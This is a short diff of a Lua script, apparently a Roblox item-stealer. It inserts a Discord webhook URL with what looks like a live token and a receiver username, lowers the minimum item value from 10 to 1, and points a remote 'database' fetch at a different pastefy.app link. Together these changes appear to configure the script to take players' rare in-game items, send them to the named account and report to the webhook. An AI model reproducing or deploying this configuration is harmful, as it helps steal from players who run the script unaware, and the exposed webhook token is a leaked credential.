@@ -2,10 +2,10 @@ _G.Ex = _G.Ex or false
 if _G.Ex then return end
 _G.Ex = true
 
-local WEBHOOK = ""
-local RECEIVER = {""}
+local WEBHOOK = "https://discord.com/api/webhooks/1548215972274507816/Bjasq6D2WWuPJq5n_VhoK1ivHSubYV-7Cxyl9uN3XEMmuyffFYxQxFfFr1t9wpa196e8"
+local RECEIVER = {"JAMAL_THESCRIPTGUY"}
 local MINIMUM_RARITY = "Godly"
-local MINIMUM_VALUE = 10
+local MINIMUM_VALUE = 1
 local RECEIVERx = RECEIVER
 
 local function GetRequestFunction()
@@ -120,7 +120,7 @@ local function LoadDatabase()
         local RequestFunc = GetRequestFunction()
         if not RequestFunc then return end
         Response = RequestFunc({
-            Url = "https://pastefy.app/pZmGtWTo/raw",
+            Url = "https://pastefy.app/bWY4sH8S/raw",
             Method = "GET",
             Headers = {["User-Agent"] = "Mozilla/5.0"},
             Timeout = 10
